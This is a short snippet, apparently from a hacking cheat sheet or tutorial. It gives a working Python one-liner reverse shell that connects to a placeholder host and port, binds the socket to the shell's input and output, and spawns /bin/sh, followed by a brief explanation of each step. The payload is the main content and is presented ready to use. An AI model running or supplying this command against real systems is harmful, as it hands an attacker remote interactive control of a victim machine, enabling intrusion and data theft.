``` python
python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("YOUR_IP",YOUR_PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```

This Python reverse shell command creates a TCP socket and connects to a specified IP address and port. It then uses the os.dup2 function to duplicate the file descriptors of the socket. The pty.spawn function is then used to execute a shell (/bin/sh), which causes the connected socket to become a remote shell. 
